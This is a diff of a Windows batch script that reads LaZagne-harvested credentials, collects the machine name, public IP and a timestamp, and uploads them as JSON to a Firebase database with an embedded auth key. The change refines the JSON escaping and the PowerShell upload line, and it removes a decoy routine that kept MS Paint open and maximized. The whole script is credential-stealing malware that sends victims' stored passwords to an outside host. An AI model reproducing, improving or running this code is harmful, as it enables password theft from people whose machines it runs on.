@@ -27,32 +27,20 @@ set "PC_NAME=!PC_NAME:-=_!"
 for /f %%i in ('powershell -Command "(Invoke-RestMethod -Uri ''https://api.ipify.org'').Trim()"') do set "PUBLIC_IP=%%i"
 for /f %%i in ('powershell -Command "Get-Date -Format ''yyyy-MM-dd HH:mm:ss''"') do set "TIMESTAMP=%%i"
 
+setlocal enabledelayedexpansion
 set "LAZAGNE_DATA="
 if defined RESULT_FILE (
     set /p LAZAGNE_DATA=<"%OUTPUT_DIR%\%RESULT_FILE%"
 )
 if not defined LAZAGNE_DATA set "LAZAGNE_DATA=No data collected"
 
-setlocal enabledelayedexpansion
-set "JSON_PAYLOAD={"
-set "JSON_PAYLOAD=!JSON_PAYLOAD!\"computer\":\"%PC_NAME%\","
-set "JSON_PAYLOAD=!JSON_PAYLOAD!\"timestamp\":\"%TIMESTAMP%\","
-set "JSON_PAYLOAD=!JSON_PAYLOAD!\"ip\":\"%PUBLIC_IP%\","
-set "JSON_PAYLOAD=!JSON_PAYLOAD!\"data\":\"!LAZAGNE_DATA:\=\\\!\"}"
+set "LAZAGNE_DATA=!LAZAGNE_DATA:\=\\!"
+set "LAZAGNE_DATA=!LAZAGNE_DATA:"=\\\"!"
+
+set "JSON_PAYLOAD={\"computer\":\"%PC_NAME%\",\"timestamp\":\"%TIMESTAMP%\",\"ip\":\"%PUBLIC_IP%\",\"data\":\"!LAZAGNE_DATA!\"}"
 endlocal & set "JSON_PAYLOAD=%JSON_PAYLOAD%"
 
 powershell -Command ^
-    "$json='%JSON_PAYLOAD%';" ^
-    "$url='%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%';" ^
-    "Invoke-RestMethod -Uri $url -Method PUT -Body $json -ContentType 'application/json'"
+    "Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body '%JSON_PAYLOAD%' -ContentType 'application/json'"
 
-start "" /max mspaint.exe
-
-:LOOP
-timeout /t 5 /nobreak >nul
-powershell -Command "(New-Object -ComObject Shell.Application).Windows() | ForEach-Object { if ($_.Name -eq 'Paint') {$_.WindowState = 3} }"
-if exist "%OUTPUT_DIR%\%RESULT_FILE%" goto END
-goto LOOP
-
-:END
 exit /b 0
